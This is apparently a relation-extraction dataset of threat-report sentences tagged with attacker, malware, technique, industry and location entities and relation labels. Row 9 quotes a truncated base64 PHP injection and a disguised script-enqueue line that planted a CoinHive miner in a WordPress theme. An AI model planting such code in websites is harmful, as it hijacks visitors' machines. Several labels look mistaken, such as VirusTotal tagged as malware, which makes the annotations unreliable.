0	Finally, some potential CozyDuke activity was detected during November 2018, apparently targeting [E11:industry] diplomatic [E12:industry] and governmental entities in [E21:location] Europe [E22:location].	3	from
1	[E11:malware] BLACKCOFFEE [E12:malware]: a [E21:technique] backdoor [E22:technique] that obfuscates its communications as normal traffic to legitimate websites such as Github and Microsoft's Technet portal.	2	use
2	Based on our analysis we believe this new malware, which we are calling [E21:malware] TidePool [E22:malware], is an evolution of the BS2005 malware family used by the [E11:attacker] Ke3chang [E12:attacker] actor.	2	use
3	One big unknown was the infection vector for [E11:attacker] Turla [E12:attacker] (aka [E21:attacker] Snake [E22:attacker] or Uroburos).	4	same
4	The third persona, “SuperHard,” is the creator or a significant contributor to the AURIGA and [E21:malware] BANGAT [E22:malware] malware families which we have observed [E11:attacker] APT1 [E12:attacker] and other APT groups use. “SuperHard” discloses his location to be the Pudong New Area of Shanghai.	2	use
5	In addition to purely [E11:malware] XAgent [E12:malware] based code, we also observe [E21:malware] zebrocy [E22:malware] modules completely recoded into powershell from .Net.	5	similar
6	In July 2017, we observed the [E11:attacker] OilRig [E12:attacker] group using a tool they developed called [E21:malware] ISMAgent [E22:malware] in a new set of targeted attacks.	2	use
7	Attack Analysis While investigating new BBSRAT instances discovered using the AutoFocus tool, Unit 42 was able to collect additional samples, weaponized documents, and [E21:technique] phishing [E22:technique] emails uploaded to [E11:malware] VirusTotal [E12:malware] between August 2015 through February 2016.	2	use
8	Figure 4 – OilRig set up a fake Oxford conference Back in December 2015, the experts from Symantec published a detailed analysis of the cyber espionage campaign conducted by two Iran-based hacker groups, dubbed Cadelle and [E11:attacker] Chafer [E12:attacker], which used the [E21:technique] backdoor [E22:technique].Cadelspy and backdoor.Remexi to spy on Iranian individuals and Middle Eastern organizations.	2	use
9	The first was this piece of code hidden with base64 in the theme’s header.php file: echo base64_decode ("PHNjcmlwdCBzcmM9Imh0dHBzOi8vc2VjdXJpdHkuZmJsYXN0ZXIuY29...skipped ...HAgZWNobyB0aW1lKCk7ID8+Ij48L3NjcmlwdD4="); Which was decoded and revealed to the same security.fblaster[.]com script that loaded the CoinHive miner. <script src="hxxps://security.fblaster[.]com/redacted.js?id=<?php echo time(); ?>"></script> In another case, the same header.php file was modified to add this harmless looking line: wp_enqueue_script('panel', THESIS_SCRIPTS_FOLDER . '/panel.js'); Contrary to what a webmaster might think, panel.js didn’t belong to the theme – it contained the whole code of the [E11:malware] CoinHive [E12:malware] [E21:tool] JavaScript [E22:tool] miner and the code that automatically started the mining process.	2	use
10	[E11:attacker] IronHusky [E12:attacker] was a campaign we first discovered in July targeting Russian and [E21:location] Mongolian [E22:location] government, aviation companies, and research institutes.	1	attack
11	In addition, the US Government has warned that the Hidden Cobra group has been using a Trojan horse called [E11:malware] Volgmer [E12:malware] in attempts to secretly compromise systems at [E21:industry] government [E22:industry], financial, automotive, and media industries.	1	attack
12	The [E11:attacker] Turla [E12:attacker] group tends to focus on satellite Internet providers located in the Middle East and Africa, including Congo, Lebanon, Libya, Niger, Nigeria, Somalia and the [E21:location] UAE [E22:location].	1	attack
13	The [E11:attacker] APT33 [E12:attacker] victims include a U.S. firm in the aerospace sector, a Saudi Arabian business conglomerate with [E21:industry] aviation [E22:industry] holdings, and a South Korean company involved in oil refining and petrochemicals.	1	attack
14	Following the booming ransomware trend that picked up speed in 2015, [E11:malware] Necurs [E12:malware] continued to distribute crypto-ransomware Trojans that year, sometimes through well-known exploits kits such as [E21:malware] Magnitude [E22:malware] and Angler.	5	similar
15	In April, we notified customers of two new experimental [E21:tool] macro [E22:tool] techniques utilized by [E11:attacker] Sofacy [E12:attacker].	2	use
16	The term [E11:attacker] APT1 [E12:attacker] is referred to one of the numerous cyber espionage campaigns that stole the major quantity of information all over the world that has interested different sectors from IT to [E21:industry] Energy [E22:industry] sector.	1	attack
17	Security Awareness [E11:attacker] APT1 [E12:attacker]—People’s Liberation Army of [E21:location] China [E22:location] Unit 61398 The notion of APT has been introduced for a decade.	3	from
18	After the C2 information has been collected, [E11:malware] BADNEWS [E12:malware] leverages [E21:technique] HTTP [E22:technique] for communication with the remote servers.	2	use
19	In February, malware researchers at Kaspersky Lab discovered a new piece of JavaScript malware linked to the [E11:attacker] Turla [E12:attacker] APT group that was used in targeted attacks against organizations in [E21:location] Greece [E22:location], Qatar, and Romania.	1	attack
20	The attackers, who seem to be Chinese-speaking and have been active for at least five years, target top-level [E11:industry] government [E12:industry] agencies and civil and military organisations in the Philippines, Malaysia, [E21:location] Cambodia [E22:location], Indonesia, Vietnam, Myanmar, Singapore, Nepal, Thailand, Laos and China.	3	from
21	Cylance’s report also cautions that Operation [E11:attacker] Cleaver [E12:attacker] could have a special interest in [E21:industry] airline [E22:industry] and SCADA networks present in most critical industries.	1	attack
22	Iranian Hackers used a network of fake accounts ([E11:attacker] NEWSCASTER [E12:attacker] network) on principal social media to spy on [E21:location] US [E22:location] officials and political staff worldwide, this is reported in an analysis done by iSIGHT Partners.	1	attack
23	To store the code, [E11:attacker] APT29 [E12:attacker] created a new [E21:technique] WMI [E22:technique] class and added a text property to it in order to store a string value.	2	use
24	[E11:malware] Miniduke [E12:malware] victims were located in the following 23 countries: Belgium, Brazil, Bulgaria, Czech Republic, Georgia, Germany, Hungary, [E21:location] Ireland [E22:location], Israel, Japan, Latvia, Lebanon, Lithuania, Montenegro, Portugal, Romania, Russian Federation, Slovenia, Spain, Turkey, Ukraine, United Kingdom and United States.	1	attack
25	0026 Introduction The attackers referred to as [E11:attacker] APT12 [E12:attacker] (also known as [E21:attacker] IXESHE [E22:attacker], DynCalc, and DNSCALC) recently started a new campaign targeting organizations in Japan and Taiwan.	4	same
26	Experts noticed that the [E21:technique] backdoor [E22:technique] is the same used by the [E11:attacker] APT28 [E12:attacker] in a recent campaign that targeted Montenegro after the state officially joined NATO alliance despite the strong opposition from Russian Government that threatened to retaliate.	2	use
27	According to the experts at Palo Alto Networks an IRC bot used in the Magic Hound campaign is very similar to a piece of malware used by [E11:attacker] Newscaster [E12:attacker], aka Charming Kitten and [E21:attacker] NewsBeef [E22:attacker], the Iranian actor that targeted individuals in the U.S., Israel and other countries using fake social media profiles.	4	same
28	Much like previous [E11:attacker] Oilrig [E12:attacker] attacks, the C2 domains used [E21:technique] typo-squatting [E22:technique] techniques in order to attempt to evade detection.	2	use
29	An article from the New York Times describes [E11:attacker] GhostNet [E12:attacker] as: A broader operation that, in less than two years, has infiltrated at least 1,295 computers in 103 countries, including many belonging to embassies, foreign ministries and other government offices, as well as the Dalai Lama’s Tibetan exile centers in India, Brussels, [E21:location] London [E22:location] and New York.	1	attack
30	We also discovered [E21:malware] Komplex [E22:malware] command and control (C2) domains that overlapped with previously identified phishing campaign infrastructures associated with the [E11:attacker] Sofacy [E12:attacker] group,” researchers said. “We believe (it) may have been done in order to handle compromised Windows and OS X systems using the same C2 server application with relative ease.” “The Sofacy group created the Komplex Trojan to use in attack campaigns targeting the OS X operating system – a move that showcases their continued evolution toward multi-platform attacks,” they added.	2	use
31	Reporting on [E21:malware] SPLM [E22:malware]/XAgent certainly has followed this course in 2018 as SPLM/XAgent detections wind down globally, as has [E11:attacker] Sofacy [E12:attacker]’s use of this malware from our perspective.	2	use
32	Following the trail of existing public reporting, the tie to [E11:attacker] FIN7 [E12:attacker] is essentially made based on a download observed from a MuddyWater C2, of a non-public tool “[E21:malware] DNSMessenger [E22:malware]”.	2	use
33	Read our report, [E11:attacker] APT37 [E12:attacker] (Reaper): The Overlooked North Korean Actor, to learn more about our assessment that this threat actor is working on behalf of the North Korean government, as well as various other details about their operations: Targeting: Primarily South Korea – though also Japan, Vietnam and the Middle East – in various industry verticals, including chemicals, [E21:industry] electronics [E22:industry], manufacturing, aerospace, automotive, and healthcare.	1	attack
34	A hallmark of [E11:attacker] Turla [E12:attacker] operations is iterations of their tools and code lineage in [E21:malware] Kazuar [E22:malware] can be traced back to at least 2005.	2	use
35	Hutchins is accused of helping create and distribute a malware known as the [E11:malware] Kronos [E12:malware] [E21:industry] Banking [E22:industry] Trojan.	1	attack
36	This has included [E11:industry] TV5Monde [E12:industry], a [E21:location] French [E22:location] television network, the German Parliament And the American Democratic National Committee.	3	from
37	[E11:attacker] Sofacy [E12:attacker] uses [E21:technique] spear-phishing [E22:technique] and watering-hole attacks to steal information, including account credentials, sensitive communications and documents.	2	use
38	Our research indicated a connection with the wellknown [E11:malware] Stuxnet [E12:malware] cyberweapon, designed to sabotage the [E21:location] Iranian [E22:location] nuclear program.In early 2013, we announced our research on RedOctober, a cyberespionage operation focusing on diplomatic institutions.	1	attack
39	The name “[E11:malware] Carbanak [E12:malware]” was coined by Kaspersky in this report – the malware authors refer to the backdoor as [E21:malware] Anunak [E22:malware].	5	similar
40	Many known APT network infiltration incidents in the past few years, notably the [E21:location] Chinese [E22:location] army APT1 and [E11:attacker] APT30 [E12:attacker] and the Russian army APT28, were related to cyber-espionage and intelligence gathering for national interests.	3	from
41	Dubbed APT28 by FireEye in a report published last night, the Russian hackers have targeted Eastern European governments and military organizations, the [E11:industry] government [E12:industry] of the country of [E21:location] Georgia [E22:location], as well as NATO and the Organization for Security and Cooperation in Europe (OSCE).	3	from
42	Researchers at Kaspersky Lab this morning at its Security Analyst Summit, released their update on [E11:attacker] Sofacy [E12:attacker], also known as APT28, Fancy Bear, [E21:attacker] Sednit [E22:attacker] and a handful of other monikers.	4	same
43	This Trojan is related to the [E11:malware] Elise [E12:malware] [E21:technique] backdoor [E22:technique] described in the Operation Lotus Blossom report.	2	use
44	The use of a white font coloring to hide contents within a weaponized document is a technique we had previously reported being used by the [E11:attacker] Sofacy [E12:attacker] group in a malicious [E21:tool] macro [E22:tool] attack.	2	use
45	Currently, we do not have definitive evidence that the entirety of [E11:attacker] TEMP.MixMaster [E12:attacker] activity, from TrickBot distribution and operation to [E21:malware] Ryuk [E22:malware] deployment, is being conducted by a common operator or group.	2	use
46	Multiple unnamed victim companies in different countries were targeted with the latest [E11:malware] BlackEnergy [E12:malware] malware, including victims in Russia, Germany, [E21:location] Belgium [E22:location], Turkey, Libya, Vietnam and several other countries.	1	attack
47	It is unlikely, but possible, that ISP-level [E11:malware] FinFisher [E12:malware] [E21:technique] MiTM [E22:technique] was used, considering multiple remote locations across the globe were targeted.	2	use
48	Did the Russian government direct the group responsible for the breaches and related data leaks? If so, is this simply a matter of accepted state espionage, or did it cross a line? Was the breach at the Democratic National Committee part of a concerted effort by the Russian government to interfere with the U.S. presidential election? The most consequential question remains unasked: How will Russia continue to employ a variety of methods – including hacks and leaks – to undermine the institutions, policies and actors that the Russian government perceives as constricting and condemning its forceful pursuit of its state aims? FireEye’s visibility into the operations of [E11:attacker] APT28 [E12:attacker] – a group we believe the [E21:location] Russian [E22:location] government sponsors – has given us insight into some of the government’s targets, as well as its objectives and the activities designed to further them.	3	from
49	Widespread Bank Targeting Throughout the U.S., Middle East and Asia Proofpoint initially reported on a widespread campaign targeting [E11:industry] banks [E12:industry] and financial organizations throughout the [E21:location] U.S. [E22:location] and Middle East in early 2016.	3	from
50	[E21:malware] CARBANAK [E22:malware] malware has been used heavily by [E11:attacker] FIN7 [E12:attacker] in previous operations.	2	use
51	TEMP.Periscope Background Active since at least 2013, [E11:attacker] TEMP.Periscope [E12:attacker] has primarily focused on [E21:industry] maritime [E22:industry]-related targets across multiple verticals, including engineering firms, shipping and transportation, manufacturing, defense, government offices, and research universities (targeting is summarized in Figure 1).	1	attack
52	Infection Chain 1: August 30, 2018 Once on the Visma network, [E11:attacker] APT10 [E12:attacker] attackers used the Microsoft BITSAdmin CLI tool to copy malicious tools from a suspected attacker-controlled [E21:technique] C2 [E22:technique] hosted on 173.254.236[.]158 to the \ProgramData\temp\ directory on the infected host.	2	use
53	The [E11:malware] Epic [E12:malware] Turla operation reported in 2014 involved highly selective [E21:malware] Carbon [E22:malware] delivery and was a long term global operation that affected hundreds of victims.	5	similar
54	In addition, [E11:malware] Emissary [E12:malware] appears to only be used against [E21:location] Taiwan [E22:location]ese or Hong Kong based targets, all of the decoys are written in Traditional Chinese, and they use themes related to the government or military.	1	attack
55	Older documents used by [E11:attacker] Patchwork [E12:attacker] focused on the CVE-2017-0261 vulnerability, however in late January 2018 when, paradoxically, newer documents abandoned this vulnerability to attack the older [E21:vulnerability] CVE-2015-2545 [E22:vulnerability] vulnerability.	2	use
56	0205 Today Unit 42 published new research identifying a persistent cyber espionage campaign targeting [E11:industry] government [E12:industry] and military organizations in Southeast [E21:location] Asia [E22:location].	3	from
57	[E21:malware] IoTroop [E22:malware] was unique in that the malware used to propagate the botnet, also called [E11:malware] Reaper [E12:malware], “was built using a flexible Lua engine and scripts, which means that instead of being limited to the static, pre-programmed attacks of previous exploits, its code can be easily updated on the fly, allowing massive in-place botnets to run new and more malicious attacks as soon as they become available.	4	same
58	In addition to the Hellsing/[E11:malware] msger [E12:malware] malware, we’ve identified a second generation of Trojan samples which appear to be called “[E21:malware] xweber [E22:malware]” by the attackers: “Xweber” seems to be the more recent Trojan, taking into account compilation timestamps.	5	similar
59	Our recent telemetry, however, indicates that variants of Daserf were not only used to spy on and steal from Japanese and South Korean targets, but also against Russian, Singaporean, and [E21:location] Chinese [E22:location] [E11:industry] enterprises [E12:industry].	3	from
60	By targeting [E21:industry] high-tech [E22:industry] and manufacturing operations in Japan and Taiwan, [E11:attacker] DragonOK [E12:attacker] may be acquiring trade secrets for a competitive economic advantage.While their targets and missions appear different, our researchers found enough linking evidence to demonstrate a relationship between Moafee and DragonOK, and perhaps even a third attack group.	1	attack
61	The primary [E21:technique] backdoor [E22:technique] used in the [E11:malware] Epic [E12:malware] attacks is also known as “WorldCupSec”, “TadjMakhal”, “Wipbot” or “Tavdig”.	2	use
62	Agent.btz and Turla/Uroburos The connection between [E11:attacker] Turla [E12:attacker] and [E21:malware] Agent.btz [E22:malware] is more direct, although not sufficiently so to conclude that the two programs have the same origin.	2	use
63	Our analysis of the Sednit campaign that uses the UEFI rootkit was presented September 27 at the 2018 Microsoft BlueHat conference and is described in detail in our “[E11:malware] LoJax [E12:malware]: First UEFI [E21:technique] rootkit [E22:technique] found in the wild, courtesy of the Sednit group” white paper.	2	use
64	[E11:malware] Miniduke [E12:malware] victims were located in the following 23 countries: Belgium, Brazil, [E21:location] Bulgaria [E22:location], Czech Republic, Georgia, Germany, Hungary, Ireland, Israel, Japan, Latvia, Lebanon, Lithuania, Montenegro, Portugal, Romania, Russian Federation, Slovenia, Spain, Turkey, Ukraine, United Kingdom and United States.	1	attack
65	Following up our most recent Sofacy research in February and March of 2018, we have found a new campaign that uses a lesser known tool widely attributed to the [E11:attacker] Sofacy [E12:attacker] group called [E21:malware] Zebrocy [E22:malware].	2	use
66	Once [E11:attacker] Sednit [E12:attacker] has conducted reconnaissance into potential targets – using the [E21:malware] Seduploader [E22:malware] or Downdelph malware, for example – the group then deploys its espionage toolkit, which delivers long-term monitoring of compromised devices.	2	use
67	German security firm G Data has conducted an interesting study on the malware trying to discover its authors, and its conclusion is that [E11:malware] Uroburos [E12:malware] is certainly of [E21:location] Russian [E22:location] origin.	3	from
68	Most of the victims of [E11:malware] Duqu [E12:malware] were located in [E21:location] Iran [E22:location].	3	from
69	We assess an actor using the handle “xman_1365_x” may have been involved in the development and potential use of [E11:attacker] APT33 [E12:attacker]’s [E21:malware] TURNEDUP [E22:malware] backdoor due to the inclusion of the handle in the processing-debugging (PDB) paths of many of TURNEDUP samples.	2	use
70	High-profile publicized examples of past attacks linked to the [E11:attacker] Sednit [E12:attacker] group include the US Democratic National Committee (DNC), the German [E21:industry] Parliament [E22:industry] and the French TV network TV5Monde.	1	attack
71	The overlap, as seen in Figure 9 involves two IP addresses that during the same time frame resolved both the appletree.onthenetas[.]com domain and the [E11:malware] Emissary [E12:malware] [E21:technique] C2 [E22:technique] domain of ustar5.PassAs[.]us.	2	use
72	So far, victims of [E11:malware] Regin [E12:malware] were identified in 14 countries: Algeria Afghanistan Belgium Brazil Fiji Germany [E21:location] Iran [E22:location] India Indonesia Kiribati Malaysia Pakistan Russia Syria In total, we counted 27 different victims, although it should be pointed out that the definition of a victim here refers to a full entity, including their entire network.	1	attack
73	Some of the domains found in LoJax samples have been seen before: they were used in late 2017 as C&C domains for the notorious [E11:attacker] Sednit [E12:attacker] first-stage [E21:technique] backdoor [E22:technique], SedUploader.	2	use
